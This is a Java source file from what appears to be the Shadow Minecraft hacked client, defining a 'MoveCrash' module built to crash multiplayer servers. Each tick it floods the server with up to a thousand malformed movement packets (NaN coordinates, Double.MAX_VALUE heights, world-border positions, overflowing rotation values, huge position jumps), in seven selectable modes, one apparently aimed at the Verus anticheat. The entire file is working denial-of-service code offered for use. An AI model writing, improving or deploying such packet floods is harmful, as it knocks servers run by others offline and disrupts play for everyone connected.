/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.config.EnumSetting;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.world.World;
import java.util.Random;

public class MoveCrash extends Module {

    final EnumSetting<Mode> mode = this.config.create(new EnumSetting.Builder<>(Mode.GradMove).name("Mode").description("what to crash usin").get());
    final DoubleSetting pwr = this.config.create(new DoubleSetting.Builder(500).min(1).max(1000).name("Power").description("Power to crash with").get());

    public MoveCrash() {
        super("MoveCrash", "Crash using move packets", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        ClientPlayerEntity player = client.player;

        switch(mode.getValue()){
            case Static -> {
                Random r = new Random();
                for (int i = 0; i < pwr.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(r.nextBoolean()));
                }
            }

            case GradMove -> {
                for (int i = 0; i < pwr.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(player.getX() + (i * 10000), player.getY(), player.getZ() + (i * 10000), true));
                }
            }

            case Snap -> {
                for (int i = 0; i < pwr.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(29999999, player.getY(), 29999999, true));
                }
            }

            case Rotate -> {
                for (int i = 0; i < pwr.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(Float.MAX_VALUE + 1, Float.MIN_VALUE - 1, new Random().nextBoolean()));
                }
            }

            case Verus -> {
                if (client.player.age % 100 == 0) {
                    for (int i = 0; i < pwr.getValue(); i++) {
                        player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(player.getX(), player.getY() - 1.0, player.getZ(), false));
                        player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(player.getX(), Double.MAX_VALUE, player.getZ(), false));
                    }
                }
            }

            case NaN -> {
                for (int i = 0; i < pwr.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NaN, Double.NaN, Double.NaN, true));
                }
            }

            case Tiny -> {
                for (int i = 0; i < pwr.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(player.getX() + (i * 954), player.getY(), player.getZ() + (i * 954), true));
                }
            }
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return mode.getValue().name();
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }

    public enum Mode{
        Static,
        GradMove,
        Snap,
        Rotate,
        Verus,
        NaN,
        Tiny,
    }
}
